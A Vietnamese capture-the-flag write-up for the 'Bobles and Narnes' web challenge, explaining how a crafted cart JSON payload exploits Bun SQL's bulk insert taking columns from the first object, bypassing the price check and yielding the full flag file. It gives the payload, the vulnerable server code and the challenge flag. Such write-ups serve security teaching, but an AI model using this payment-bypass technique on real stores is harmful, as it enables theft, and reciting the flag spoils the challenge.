# Exploit Chi Tiết - Bobles and Narnes

## Bối cảnh

- Web bán sách online, register được $1,000
- Sách "Flag" chứa flag thật, giá **$1,000,000**
- Mỗi sách có 2 version: **full** (trả tiền) và **sample** (miễn phí nhưng không có flag)
- Cột `is_sample` trong DB quyết định serve file nào

---

## Bước 1: Register

POST `/register` với `username` và `password` → tạo tài khoản với `balance = 1000`.

---

## Bước 2: Thêm flag vào cart

POST `/cart/add` với body JSON:

```json
{
  "products": [
    {"book_id": "a3e33c2505a19d18"},
    {"book_id": "2a16e349fb9045fa", "is_sample": 1}
  ]
}
```

Object đầu tiên **cố tình không có** key `is_sample`. Object thứ hai là flag book với `is_sample: 1`.

---

## Bước 3: Server xử lý price check (bị bypass)

Server chạy đoạn này để tính giá:

```js
const additionalSum = productsToAdd
  .filter((product) => !+product.is_sample)  // lọc bỏ sample
  .map((product) => booksLookup.get(product.book_id).price ?? 99999999)
  .reduce((l, r) => l + r, 0);
```

- Product 1: `is_sample = undefined` → `+undefined = NaN` → `!NaN = true` → **giữ lại** → giá $10
- Product 2 (flag): `is_sample = 1` → `+1 = 1` → `!1 = false` → **bị lọc ra** → **miễn phí**
- `additionalSum = 10` → `10 + 0 <= 1000` → **pass check**

---

## Bước 4: Server INSERT vào DB (lỗ hổng chính)

Server chạy:

```js
const cartEntries = productsToAdd.map((prod) => ({ ...prod, username }));
await db`INSERT INTO cart_items ${db(cartEntries)}`;
```

Mảng `cartEntries` sau spread:

```js
[
  { book_id: "a3e33c2505a19d18", username: "user" },                    // KHÔNG có is_sample
  { book_id: "2a16e349fb9045fa", is_sample: 1, username: "user" }       // CÓ is_sample
]
```

**Lỗ hổng Bun SQL:** `db()` dùng keys của object **đầu tiên** `(book_id, username)` làm danh sách cột INSERT. Cột `is_sample` không có trong object đầu → **bị bỏ qua hoàn toàn**.

SQL thực tế:

```sql
INSERT INTO cart_items (book_id, username) VALUES ('a3e3...', 'user'), ('2a16...', 'user')
```

Kết quả: cả 2 row có `is_sample = NULL` (default).

---

## Bước 5: Checkout

POST `/cart/checkout` → Server đọc cart từ DB:

```js
const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;
```

- `item.is_sample = NULL` → `NULL` là **falsy**
- Điều kiện `false` → `path = "flag.txt"` (bản **full**, không phải `flag_sample.txt`)

Server tính giá checkout:

```js
const cartSum = cart.filter((item) => !+item.is_sample) ...
// !+null = !0 = true → flag ĐƯỢC tính giá → cartSum = 1,000,010
```

Update balance: `1000 - 1000010 = -999010`. **Không có check balance >= 0** nên vẫn chạy bình thường.

---

## Bước 6: Nhận flag

Server đọc `books/flag.txt`, đóng zip, trả về. Giải nén được:

```
lactf{hojicha_chocolate_dubai_labubu}
```
